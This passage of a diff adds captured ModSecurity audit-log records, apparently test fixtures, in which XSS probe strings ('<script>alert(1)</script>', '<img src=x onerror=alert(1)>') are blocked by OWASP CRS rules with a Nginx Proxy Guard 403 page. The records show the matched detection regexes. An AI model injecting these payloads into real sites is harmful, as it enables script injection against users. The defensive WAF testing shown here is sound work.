+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "XSS Attack Detected via libinjection",
+          "details": {
+            "match": "detected XSS using libinjection.",
+            "reference": "v10,25t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "83",
+            "data": "Matched Data: XSS data found within ARGS:msg: <script>alert(1)</script>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "XSS Filter - Category 1: Script Tag Vector",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)<script[^>]*>[\\s\\S]*?' against variable `ARGS:msg' (Value: `<script>alert(1)</script>' )",
+            "reference": "o0,8v10,25t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "110",
+            "data": "Matched Data: <script> found within ARGS:msg: <script>alert(1)</script>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "NoScript XSS InjectionChecker: HTML Injection",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)<[^0-9<>A-Z_a-z]*(?:[^\\s\\x0b\\\"'<>]*:)?[^0-9<>A-Z_a-z]*[^0-9A-Z_a-z]*?(?:s[^0-9A-Z_a-z]*?(?:c[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?t|t[^0-9A-Z_a-z]*?y[^0-9A-Z_a-z]*?l[^0-9A (4396 characters omitted)' against variable `ARGS:msg' (Value: `<script>alert(1)</script>' )",
+            "reference": "o0,7v10,25t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941160",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "248",
+            "data": "Matched Data: <script found within ARGS:msg: <script>alert(1)</script>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Javascript method detected",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)\\b(?:eval|set(?:timeout|interval)|new[\\s\\x0b]+Function|a(?:lert|tob)|btoa|(?:promp|impor)t|con(?:firm|sole\\.(?:log|dir))|fetch)[\\s\\x0b]*[\\(\\{]' against variable `ARGS:msg' (Value: `<script>alert(1)</script>' )",
+            "reference": "o8,6v10,25t:htmlEntityDecode,t:jsDecode",
+            "ruleId": "941390",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "816",
+            "data": "Matched Data: alert( found within ARGS:msg: <script>alert(1)</script>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-nodejs",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 20)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `20' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34726,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414712.209002",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?msg=%3Cimg%20src=x%20onerror=alert(1)%3E",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "XSS Attack Detected via libinjection",
+          "details": {
+            "match": "detected XSS using libinjection.",
+            "reference": "v10,28t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "83",
+            "data": "Matched Data: XSS data found within ARGS:msg: <img src=x onerror=alert(1)>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "XSS Filter - Category 2: Event Handler Vector",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)[\\t-\\r \\\"'\\(,/-9;=`]on[a-z]{3,50}[\\t-\\r \\(,;]*?=[^=]' against variable `ARGS:msg' (Value: `<img src=x onerror=alert(1)>' )",
+            "reference": "o10,10v10,28t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941120",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "153",
+            "data": "Matched Data:  onerror=a found within ARGS:msg: <img src=x onerror=alert(1)>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "NoScript XSS InjectionChecker: HTML Injection",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)<[^0-9<>A-Z_a-z]*(?:[^\\s\\x0b\\\"'<>]*:)?[^0-9<>A-Z_a-z]*[^0-9A-Z_a-z]*?(?:s[^0-9A-Z_a-z]*?(?:c[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?t|t[^0-9A-Z_a-z]*?y[^0-9A-Z_a-z]*?l[^0-9A (4396 characters omitted)' against variable `ARGS:msg' (Value: `<img src=x onerror=alert(1)>' )",
+            "reference": "o0,5v10,28t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",
+            "ruleId": "941160",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "248",
+            "data": "Matched Data: <img  found within ARGS:msg: <img src=x onerror=alert(1)>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Javascript method detected",
+          "details": {
